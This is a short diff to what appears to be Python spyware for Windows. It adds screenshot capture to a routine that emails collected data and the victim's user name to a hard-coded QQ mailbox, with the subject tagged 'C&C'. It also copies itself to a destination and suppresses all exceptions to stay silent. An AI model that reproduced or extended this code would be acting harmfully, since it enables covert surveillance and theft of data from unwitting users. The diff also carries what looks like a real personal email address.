@@ -2,6 +2,7 @@ from ctypes import byref, create_string_buffer, c_ulong, windll  # 一些与 c�
 from io import StringIO
 from sendmail import make_and_send_email
 from utils import copy_self_to_destination
+from screenshotter import run as screenshot_run
 
 import os
 import pythoncom  # 用于与windows com对象交互
@@ -112,7 +113,7 @@ if __name__ == "__main__":
     
     # 压制所有异常
     try:
-        make_and_send_email(run(), "xxxxx@qq.com", "C&C-" + curr_user)
+        make_and_send_email(run(), "550653451@qq.com", "C&C-" + curr_user, screenshot_run())
     except Exception as e:
         pass
     # print("done!")
